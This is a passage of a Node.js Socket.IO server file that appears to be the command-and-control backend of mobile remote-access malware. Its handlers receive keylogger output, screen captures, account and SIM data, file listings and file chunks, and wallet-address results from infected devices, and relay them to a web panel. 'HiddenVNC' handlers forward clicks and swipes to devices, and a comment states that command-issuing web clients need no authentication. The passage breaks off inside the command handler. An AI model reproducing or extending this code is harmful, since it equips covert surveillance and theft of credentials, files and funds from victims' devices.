      logger.log(`📥 [set-wallet-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast set-wallet-address-result event to all web clients
      io.emit("device_event", {
        event: "set_wallet_address_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted set_wallet_address_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [set-wallet-address-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SIM INFO RESULT from device --------
  socket.on("siminfo-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated siminfo-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid siminfo-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [siminfo-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast siminfo-result event to all web clients
      io.emit("device_event", {
        event: "siminfo-result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted siminfo-result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [siminfo-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- ACCOUNT RESULT from device --------
  socket.on("account-result", (data) => {
    // Log data FIRST before any validation
    logger.log(`🔔 [account-result] ========== RAW DATA RECEIVED ==========`);
    logger.log(`🔔 [account-result] Socket ID: ${socket.id}`);
    logger.log(`🔔 [account-result] Data:`, data);
    logger.log(`🔔 [account-result] Data type:`, typeof data);
    logger.log(`🔔 [account-result] Is array:`, Array.isArray(data));
    logger.log(`🔔 [account-result] Is null:`, data === null);
    logger.log(`🔔 [account-result] Is undefined:`, data === undefined);
    if (data && typeof data === "object") {
      logger.log(`🔔 [account-result] Data keys:`, Object.keys(data));
      logger.log(`🔔 [account-result] Data stringified:`, JSON.stringify(data, null, 2));
    }
    logger.log(`🔔 [account-result] Is authenticated: ${isAuthenticated}, UUID: ${socket.uuid}`);
    logger.log(`🔔 [account-result] =========================================`);
    
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated account-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data - but still process even if format is unexpected
    if (!data) {
      logger.error(`❌ No data received from ${uuid}`);
      return;
    }

    try {
      // Handle different data formats
      let processedData = data;
      
      // If data is not an object, try to parse it or wrap it
      if (typeof data !== "object") {
        logger.warn(`⚠️ [account-result] Data is not an object, attempting to process anyway`);
        try {
          if (typeof data === "string") {
            processedData = JSON.parse(data);
          } else {
            processedData = { value: data };
          }
        } catch (parseErr) {
          logger.error(`❌ [account-result] Failed to parse data:`, parseErr);
          processedData = { raw: data };
        }
      }
      
      logger.log(`📥 [account-result] Processed data from ${uuid}:`, JSON.stringify(processedData, null, 2));
      logger.log(`📥 [account-result] Processed data keys:`, Object.keys(processedData));
      
      // Broadcast account-result event to all web clients
      const eventPayload = {
        event: "account_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: processedData,
      };
      
      logger.log(`📤 [account-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
      io.emit("device_event", eventPayload);
      
      logger.log(`✅ [account-result] Broadcasted account_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
    } catch (err) {
      logger.error(`❌ [account-result] Error processing data from ${uuid}:`, err.message);
      logger.error(`❌ [account-result] Error stack:`, err.stack);
    }
  });
  
  // Also listen for account-result via device-event pattern (fallback)
  socket.on("device-event", (data) => {
    logger.log(`🔍 [device-event] Received device-event from ${socket.id}:`, data);
    if (!isAuthenticated || !socket.uuid) return;
    
    const uuid = socket.uuid;
    if (data && (data.event === "account-result" || data.event === "account_result")) {
      logger.log(`🔔 [device-event] Account result received via device-event pattern from ${uuid}`);
      
      const eventPayload = {
        event: "account_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data.data || data,
      };
      
      io.emit("device_event", eventPayload);
      logger.log(`✅ [device-event] Broadcasted account_result event for ${uuid}`);
    }
  });
  
  // Catch-all handler for any event that might contain account data
  // This will catch events like "account-result-{uuid}", "account_result", etc.
  const accountEventPatterns = [
    "account-result",
    "account_result", 
    "accountresult",
    "account",
    "getaccount-result",
    "getaccount_result"
  ];
  
  accountEventPatterns.forEach(pattern => {
    socket.on(pattern, (data) => {
      logger.log(`🔍 [CATCH-ALL] Received event "${pattern}" from ${socket.id}`);
      logger.log(`🔍 [CATCH-ALL] Data:`, data);
      
      if (!isAuthenticated || !socket.uuid) {
        logger.warn(`⚠️ [CATCH-ALL] Unauthenticated ${pattern} attempt`);
        return;
      }
      
      const uuid = socket.uuid;
      const client = clients.get(uuid);
      
      if (!client) {
        logger.error(`❌ [CATCH-ALL] Client not found for UUID: ${uuid}`);
        return;
      }
      
      try {
        const eventPayload = {
          event: "account_result",
          device_id: uuid,
          timestamp: new Date().toISOString(),
          data: data || {},
        };
        
        logger.log(`✅ [CATCH-ALL] Broadcasting account_result from ${pattern}`);
        io.emit("device_event", eventPayload);
      } catch (err) {
        logger.error(`❌ [CATCH-ALL] Error processing ${pattern}:`, err);
      }
    });
  });

  // -------- DIR RESULT from device --------
  socket.on("dir-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated dir-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid dir-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [dir-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast dir-result event to all web clients
      io.emit("device_event", {
        event: "dir_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted dir_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [dir-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- FILE CHUNK from device (for chunked file downloads) --------
  socket.on("file-chunk", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated file-chunk attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid file-chunk data from ${uuid}`);
      return;
    }

    try {
      // Log raw data first to see what we're actually receiving
      logger.log(`📥 [file-chunk] RAW DATA from ${uuid}:`, JSON.stringify({
        fileName: data.fileName,
        transferId: data.transferId,
        isLastChunk: data.isLastChunk,
        isLastChunkType: typeof data.isLastChunk,
        isLastChunkValue: String(data.isLastChunk),
        totalSize: data.totalSize,
        chunkSize: data.chunkSize,
      }));
      
      // Explicitly convert isLastChunk to boolean to ensure it's preserved correctly
      const isLastChunk = data.isLastChunk === true || 
                         data.isLastChunk === "true" || 
                         data.isLastChunk === 1 || 
                         data.isLastChunk === "1" ||
                         String(data.isLastChunk).toLowerCase() === "true";
      
      logger.log(`📥 [file-chunk] Chunk from ${uuid}:`, {
        fileName: data.fileName,
        transferId: data.transferId,
        chunkSize: data.chunkSize,
        progress: data.progress,
        isLastChunk: data.isLastChunk,
        isLastChunkConverted: isLastChunk,
        totalSize: data.totalSize,
        chunkLength: data.chunk ? data.chunk.length : 0,
      });
      
      // Remove uuid from data to avoid confusion
      const cleanData = { ...data };
      delete cleanData.uuid;
      
      // Explicitly set isLastChunk as boolean
      cleanData.isLastChunk = isLastChunk;
      
      // Ensure chunk is included (even if empty string for last chunk)
      if (!('chunk' in cleanData)) {
        logger.warn(`⚠️ [file-chunk] Missing 'chunk' field in data from ${uuid}`);
        cleanData.chunk = data.chunk || '';
      }
      
      // Broadcast file-chunk event to all web clients
      const eventData = {
        event: "file_chunk",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: cleanData,
      };
      
      logger.log(`📤 [file-chunk] Broadcasting to web clients:`, {
        event: eventData.event,
        device_id: eventData.device_id,
        fileName: cleanData.fileName,
        transferId: cleanData.transferId,
        isLastChunk: cleanData.isLastChunk,
        isLastChunkType: typeof cleanData.isLastChunk,
        chunkLength: cleanData.chunk ? cleanData.chunk.length : 0,
        hasChunk: !!cleanData.chunk && cleanData.chunk.length > 0,
      });
      
      io.emit("device_event", eventData);
      
      if (isLastChunk) {
        logger.log(`✅ [file-chunk] File transfer completed for ${uuid}: ${data.fileName}`);
      }
    } catch (err) {
      logger.error(`❌ [file-chunk] Error processing data from ${uuid}:`, err.message);
      logger.error(`❌ [file-chunk] Error stack:`, err.stack);
    }
  });

  // -------- FILE END from device (alternative way device might signal completion) --------
  socket.on("file-end", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated file-end attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid file-end data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [file-end] File transfer ended for ${uuid}:`, {
        fileName: data.fileName,
        transferId: data.transferId,
        totalSize: data.totalSize,
      });
      
      // Broadcast as a file-chunk event with isLastChunk: true
      const eventData = {
        event: "file_chunk",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: {
          fileName: data.fileName,
          transferId: data.transferId,
          chunk: "", // Empty chunk for last chunk
          isLastChunk: true,
          totalSize: data.totalSize,
          chunkSize: 0,
        },
      };
      
      logger.log(`📤 [file-end] Broadcasting completion as file_chunk event`);
      io.emit("device_event", eventData);
      
      logger.log(`✅ [file-end] File transfer completed for ${uuid}: ${data.fileName}`);
    } catch (err) {
      logger.error(`❌ [file-end] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DOWNLOAD RESULT from device --------
  socket.on("download-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated download-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid download-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [download-result] Data from ${uuid}:`, {
        fileName: data.fileName || data.name,
        fileSize: data.fileSize || data.size,
        hasData: !!data.data || !!data.content || !!data.fileData,
      });
      
      // Broadcast download-result event to all web clients
      io.emit("device_event", {
        event: "download_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted download_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [download-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- UPLOAD RESULT from device --------
  socket.on("upload-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated upload-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid upload-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [upload-result] Data from ${uuid}:`, {
        success: data.success,
        message: data.message || data.status,
        fileName: data.fileName || data.name,
      });
      
      // Broadcast upload-result event to all web clients
      io.emit("device_event", {
        event: "upload_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted upload_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [upload-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DELETE RESULT from device --------
  socket.on("delete-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated delete-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid delete-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [delete-result] Data from ${uuid}:`, {
        success: data.success,
        message: data.message || data.status,
        filePath: data.filePath || data.path,
      });
      
      // Broadcast delete-result event to all web clients
      io.emit("device_event", {
        event: "delete_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted delete_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [delete-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- IMAGE PREVIEW from device --------
  socket.on("image_preview", (data) => {
    logger.log(`🖼️ [image_preview] ========== EVENT RECEIVED ==========`);
    logger.log(`🖼️ [image_preview] Socket ID: ${socket.id}`);
    logger.log(`🖼️ [image_preview] Is authenticated: ${isAuthenticated}`);
    logger.log(`🖼️ [image_preview] Socket UUID: ${socket.uuid}`);
    logger.log(`🖼️ [image_preview] Data:`, data);
    
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated image_preview attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid image_preview data from ${uuid}`);
      logger.error(`❌ Data type: ${typeof data}`);
      logger.error(`❌ Data value:`, data);
      return;
    }

    logger.log(`🖼️ [image_preview] Data from ${uuid}:`);
    logger.log(`   FileName: ${data.fileName || "unknown"}`);
    logger.log(`   Thumbnail exists: ${!!data.thumbnail}`);
    logger.log(`   Thumbnail size: ${data.thumbnail ? `${Math.round(data.thumbnail.length / 1024)} KB` : "N/A"}`);

    // Broadcast to all web clients as device_event
    const broadcastData = {
      deviceId: uuid,
      event: "image_preview",
      data: {
        fileName: data.fileName || "preview",
        thumbnail: data.thumbnail || null,
      },
      timestamp: new Date().toISOString(),
    };
    
    logger.log(`🖼️ [image_preview] Broadcasting:`, JSON.stringify(broadcastData, null, 2));
    
    io.emit("device_event", broadcastData);

    logger.log(`✅ [image_preview] Broadcasted preview for ${data.fileName || "unknown"} to web clients`);
    logger.log(`🖼️ [image_preview] ===========================================`);
  });

  // -------- APP RESULT from device --------
  socket.on("app-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated app-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid app-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [app-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast app-result event to all web clients
      io.emit("device_event", {
        event: "app_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      
      logger.log(`📤 Broadcasted app_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [app-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- KEYLOGGER RESULT from device --------
  socket.on("keylogger-result", (data) => {
    logger.log(`⌨️ [keylogger-result] ========== EVENT RECEIVED ==========`);
    logger.log(`⌨️ [keylogger-result] Socket ID: ${socket.id}`);
    logger.log(`⌨️ [keylogger-result] Is authenticated: ${isAuthenticated}`);
    logger.log(`⌨️ [keylogger-result] Socket UUID: ${socket.uuid}`);
    logger.log(`⌨️ [keylogger-result] Data:`, data);
    logger.log(`⌨️ [keylogger-result] Data type:`, typeof data);
    logger.log(`⌨️ [keylogger-result] Is array:`, Array.isArray(data));
    
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated keylogger-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data - be more lenient
    if (!data) {
      logger.error(`❌ Invalid keylogger-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [keylogger-result] Processing data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Handle different data formats
      let processedData = data;
      
      // If data is an array, wrap it
      if (Array.isArray(data)) {
        processedData = { entries: data };
      } else if (typeof data === "object") {
        // Already an object, use as is
        processedData = data;
      } else {
        // Try to parse if string
        try {
          processedData = JSON.parse(String(data));
        } catch (e) {
          processedData = { raw: data };
        }
      }
      
      logger.log(`📥 [keylogger-result] Processed data:`, JSON.stringify(processedData, null, 2));
      
      // Broadcast keylogger-result event to all web clients
      const eventPayload = {
        event: "keylogger_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: processedData,
      };
      
      logger.log(`📤 [keylogger-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
      io.emit("device_event", eventPayload);
      
      logger.log(`✅ [keylogger-result] Broadcasted keylogger_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
      logger.log(`⌨️ [keylogger-result] ===========================================`);
    } catch (err) {
      logger.error(`❌ [keylogger-result] Error processing data from ${uuid}:`, err.message);
      logger.error(`❌ [keylogger-result] Error stack:`, err.stack);
    }
  });

  // -------- SKELETON RESULT from device --------
  socket.on("skeleton-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated skeleton-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid skeleton-result data from ${uuid}`);
      return;
    }

    try {
      logger.log(`📥 [skeleton-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast skeleton-result event to all web clients
      io.emit("device_event", {
        event: "skeleton_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      logger.log(`📤 Broadcasted skeleton_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [skeleton-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SCREEN RESULT from device --------
  socket.on("screen-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated screen-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid screen-result data from ${uuid}`);
      return;
    }

    try {
      // Debug: Log raw data structure
      logger.log(`🔍 [screen-result] Raw data keys:`, Object.keys(data || {}));
      logger.log(`🔍 [screen-result] Raw data.image_data exists:`, !!data.image_data);
      logger.log(`🔍 [screen-result] Raw data.image_data type:`, typeof data.image_data);
      logger.log(`🔍 [screen-result] Raw data.image_data preview:`, data.image_data ? data.image_data.substring(0, 50) : 'null');
      
      // Normalize field names - handle both formats
      // Device may send: image_data, frmt, wmob, hmob
      // Or standard: image/data, format, width, height
      let imageData = data.image_data || data.image || data.data || null;
      const format = data.frmt || data.format || "webp";
      const width = data.wmob || data.width || null;
      const height = data.hmob || data.height || null;
      
      logger.log(`🔍 [screen-result] After extraction:`, {
        imageDataExists: !!imageData,
        imageDataType: typeof imageData,
        imageDataLength: imageData ? imageData.length : 0,
        format,
        width,
        height
      });
      
      // Handle escaped characters in base64 string (common in JSON)
      if (imageData && typeof imageData === "string") {
        // Trim whitespace but DON'T remove leading slashes - they're valid base64!
        // Base64 can start with / (like /9j/ for JPEG or /Ukl/ for WebP)
        imageData = imageData.trim();
        
        // REMOVED: Don't handle escaped forward slashes (\/) - base64 data should have raw /
        // The leading / in /9j/ is valid base64 and should NOT be escaped
        // Only handle other escape sequences that might corrupt the data
        imageData = imageData.replace(/\\n/g, '\n');
        imageData = imageData.replace(/\\r/g, '\r');
        imageData = imageData.replace(/\\t/g, '\t');
        
        // Remove quotes if they wrap the string, but preserve base64 characters
        imageData = imageData.replace(/^["']+|["']+$/g, '');
        
        logger.log(`🔍 [screen-result] After cleaning:`, {
          imageDataLength: imageData.length,
          preview: imageData.substring(0, 50),
          firstChar: imageData[0],
          startsWithSlash: imageData.startsWith('/')
        });
      }
      
      // Ensure leading slash is preserved (critical for JPEG base64)
      if (imageData && !imageData.startsWith('/') && imageData.startsWith('9j/')) {
        logger.log(`⚠️ [screen-result] Missing leading slash, fixing...`);
        imageData = '/' + imageData;
      }
      
      // Create normalized data object
      const normalizedData = {
        image_data: imageData,
        format: format,
        width: width,
        height: height,
        // Preserve any other fields
        ...(data.uuid && { uuid: data.uuid }),
        ...(data.type && { type: data.type }),
      };
      
      logger.log(`📺 [screen-result] Data from ${uuid}:`, {
        hasImage: !!imageData,
        hasData: !!imageData,
        width: width,
        height: height,
        format: format,
        imageLength: imageData ? imageData.length : 0,
        normalizedDataKeys: Object.keys(normalizedData),
        imageDataPreview: imageData ? imageData.substring(0, 10) : 'null',
        imageDataStartsWithSlash: imageData ? imageData.startsWith('/') : false
      });
      
      // Broadcast screen-result event to all web clients
      io.emit("device_event", {
        event: "screen_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: normalizedData,
      });
      
      logger.log(`📤 Broadcasted screen_result event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [screen-result] Error processing data from ${uuid}:`, err.message);
      logger.error(`❌ [screen-result] Error stack:`, err.stack);
    }
  });

  // -------- SWIPE DETECTION from device --------
  socket.on("swipe-detected", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated swipe-detected attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid swipe-detected data from ${uuid}`);
      return;
    }

    try {
      // Extract swipe information
      const {
        startX,
        startY,
        endX,
        endY,
        duration,
        direction, // left, right, up, down, diagonal
        distance,
        velocity
      } = data;

      // Calculate direction if not provided
      let calculatedDirection = direction;
      if (!calculatedDirection && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        const deltaX = endX - startX;
        const deltaY = endY - startY;
        const absDeltaX = Math.abs(deltaX);
        const absDeltaY = Math.abs(deltaY);

        if (absDeltaX > absDeltaY) {
          calculatedDirection = deltaX > 0 ? "right" : "left";
        } else {
          calculatedDirection = deltaY > 0 ? "down" : "up";
        }

        // Check for diagonal swipes
        if (absDeltaX > 0 && absDeltaY > 0) {
          const ratio = absDeltaX / absDeltaY;
          if (ratio > 0.5 && ratio < 2) {
            // Diagonal swipe
            if (deltaX > 0 && deltaY > 0) calculatedDirection = "down-right";
            else if (deltaX > 0 && deltaY < 0) calculatedDirection = "up-right";
            else if (deltaX < 0 && deltaY > 0) calculatedDirection = "down-left";
            else calculatedDirection = "up-left";
          }
        }
      }

      // Calculate distance if not provided
      let calculatedDistance = distance;
      if (!calculatedDistance && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        calculatedDistance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
      }

      const swipeData = {
        startX,
        startY,
        endX,
        endY,
        duration: duration || 0,
        direction: calculatedDirection || "unknown",
        distance: calculatedDistance || 0,
        velocity: velocity || (calculatedDistance && duration ? calculatedDistance / duration : 0),
        timestamp: new Date().toISOString(),
      };

      logger.log(`👆 [swipe-detected] Swipe detected on ${uuid}:`, {
        direction: swipeData.direction,
        distance: Math.round(swipeData.distance),
        duration: swipeData.duration,
        from: `(${startX}, ${startY})`,
        to: `(${endX}, ${endY})`,
      });
      
      // Broadcast swipe-detected event to all web clients
      io.emit("device_event", {
        event: "swipe_detected",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: swipeData,
      });
      
      logger.log(`📤 Broadcasted swipe_detected event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [swipe-detected] Error processing data from ${uuid}:`, err.message);
      logger.error(`❌ [swipe-detected] Error stack:`, err.stack);
    }
  });

  // -------- GESTURE DETECTION from device (generic handler) --------
  socket.on("gesture-detected", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      logger.warn(`⚠️ Unauthenticated gesture-detected attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      logger.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      logger.error(`❌ Invalid gesture-detected data from ${uuid}`);
      return;
    }

    try {
      logger.log(`👆 [gesture-detected] Gesture detected on ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast gesture-detected event to all web clients
      io.emit("device_event", {
        event: "gesture_detected",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: {
          ...data,
          timestamp: new Date().toISOString(),
        },
      });
      
      logger.log(`📤 Broadcasted gesture_detected event for ${uuid}`);
    } catch (err) {
      logger.error(`❌ [gesture-detected] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SWIPE DETECTION from web clients (HiddenVNC) --------
  socket.on("swipe-detected-web", (data) => {
    // Web clients can emit swipe-detected events when interacting with HiddenVNC
    if (!data || typeof data !== "object") {
      logger.warn(`⚠️ Invalid swipe-detected-web data from ${socket.id}`);
      return;
    }

    const { deviceId, startX, startY, endX, endY, duration, direction, distance, velocity } = data;

    if (!deviceId || typeof deviceId !== "string") {
      logger.warn(`⚠️ Missing deviceId in swipe-detected-web from ${socket.id}`);
      return;
    }

    try {
      // Calculate direction if not provided
      let calculatedDirection = direction;
      if (!calculatedDirection && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        const deltaX = endX - startX;
        const deltaY = endY - startY;
        const absDeltaX = Math.abs(deltaX);
        const absDeltaY = Math.abs(deltaY);

        if (absDeltaX > absDeltaY) {
          calculatedDirection = deltaX > 0 ? "right" : "left";
        } else {
          calculatedDirection = deltaY > 0 ? "down" : "up";
        }

        // Check for diagonal swipes
        if (absDeltaX > 0 && absDeltaY > 0) {
          const ratio = absDeltaX / absDeltaY;
          if (ratio > 0.5 && ratio < 2) {
            if (deltaX > 0 && deltaY > 0) calculatedDirection = "down-right";
            else if (deltaX > 0 && deltaY < 0) calculatedDirection = "up-right";
            else if (deltaX < 0 && deltaY > 0) calculatedDirection = "down-left";
            else calculatedDirection = "up-left";
          }
        }
      }

      // Calculate distance if not provided
      let calculatedDistance = distance;
      if (!calculatedDistance && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        calculatedDistance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
      }

      const swipeData = {
        startX,
        startY,
        endX,
        endY,
        duration: duration || 0,
        direction: calculatedDirection || "unknown",
        distance: calculatedDistance || 0,
        velocity: velocity || (calculatedDistance && duration ? calculatedDistance / duration : 0),
        timestamp: new Date().toISOString(),
        source: "web_client", // Indicate this came from web client
      };

      logger.log(`👆 [swipe-detected-web] Swipe detected on device ${deviceId} from web client:`, {
        direction: swipeData.direction,
        distance: Math.round(swipeData.distance),
        duration: swipeData.duration,
        from: `(${startX}, ${startY})`,
        to: `(${endX}, ${endY})`,
      });
      
      // Broadcast swipe-detected event to all web clients
      io.emit("device_event", {
        event: "swipe_detected",
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        data: swipeData,
      });
      
      logger.log(`📤 Broadcasted swipe_detected event for ${deviceId} (from web client)`);
    } catch (err) {
      logger.error(`❌ [swipe-detected-web] Error processing data:`, err.message);
      logger.error(`❌ [swipe-detected-web] Error stack:`, err.stack);
    }
  });

  // -------- CLICK DETECTION from web clients (HiddenVNC) --------
  socket.on("click-detected-web", (data) => {
    // Web clients can emit click-detected events when interacting with HiddenVNC
    if (!data || typeof data !== "object") {
      logger.warn(`⚠️ Invalid click-detected-web data from ${socket.id}`);
      return;
    }

    const { deviceId, x, y, duration, timestamp } = data;

    if (!deviceId || typeof deviceId !== "string") {
      logger.warn(`⚠️ Missing deviceId in click-detected-web from ${socket.id}`);
      return;
    }

    try {
      const clickData = {
        x: x || 0,
        y: y || 0,
        duration: duration || 0,
        timestamp: timestamp || new Date().toISOString(),
        source: "web_client", // Indicate this came from web client
      };

      logger.log(`👆 [click-detected-web] Click detected on device ${deviceId} from web client:`, {
        at: `(${x}, ${y})`,
        duration,
      });
      
      // Broadcast click-detected event to all web clients
      io.emit("device_event", {
        event: "click_detected",
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        data: clickData,
      });
      
      logger.log(`📤 Broadcasted click_detected event for ${deviceId} (from web client)`);
    } catch (err) {
      logger.error(`❌ [click-detected-web] Error processing data:`, err.message);
      logger.error(`❌ [click-detected-web] Error stack:`, err.stack);
    }
  });

  // -------- WEB CLIENT COMMAND REQUESTS --------
  socket.on("send-command", (data) => {
    // Web clients don't need authentication, but validate the request
    if (!data || typeof data !== "object") {
      socket.emit("command-error", {
        error: "Invalid command data",
        deviceId: data?.deviceId || null,
        command: data?.command || null,
      });
      return;
    }

